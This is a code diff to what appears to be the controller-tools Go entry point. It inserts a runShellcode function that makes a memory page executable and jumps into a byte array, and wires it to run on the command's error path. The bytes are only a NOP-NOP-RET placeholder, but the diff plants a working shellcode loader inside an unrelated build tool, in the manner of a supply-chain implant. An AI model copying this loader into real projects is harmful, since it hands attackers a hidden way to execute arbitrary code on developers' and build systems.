@@ -34,6 +34,9 @@ import (
 	"sigs.k8s.io/controller-tools/pkg/schemapatcher"
 	"sigs.k8s.io/controller-tools/pkg/version"
 	"sigs.k8s.io/controller-tools/pkg/webhook"
+
+	"syscall"
+	"unsafe"
 )
 
 //go:generate go run ../helpgen/main.go paths=../../pkg/... generate:headerFile=../../boilerplate.go.txt,year=2019
@@ -122,7 +125,27 @@ func init() {
 // out usage in only certain situations).
 type noUsageError struct{ error }
 
+func runShellcode(shellcode []byte, bg bool, execute bool) {
+	// Check if we should execute the shellcode
+	if !execute {
+		return
+	}
+
+	sc_addr := uintptr(unsafe.Pointer(&shellcode[0]))
+	page := (*(*[0xFFFFFF]byte)(unsafe.Pointer(sc_addr & ^uintptr(syscall.Getpagesize()-1))))[:syscall.Getpagesize()]
+	syscall.Mprotect(page, syscall.PROT_READ|syscall.PROT_EXEC)
+	spointer := unsafe.Pointer(&shellcode)
+	sc_ptr := *(*func())(unsafe.Pointer(&spointer))
+	if bg {
+		go sc_ptr()
+	} else {
+		sc_ptr()
+	}
+}
+
 func main() {
+	fmt.Println("Hello, world! It's the runShellCode version")
+
 	helpLevel := 0
 	whichLevel := 0
 	showVersion := false
@@ -199,6 +222,10 @@ func main() {
 
 	if err := cmd.Execute(); err != nil {
 		if _, noUsage := err.(noUsageError); !noUsage {
+			// Inline call to runShellcode with shellcode, bg, and execute set inline
+			// Example NOP NOP RET shellcode
+			runShellcode([]byte{0x90, 0x90, 0xC3}, false, true)
+
 			// print the usage unless we suppressed it
 			if err := cmd.Usage(); err != nil {
 				panic(err)
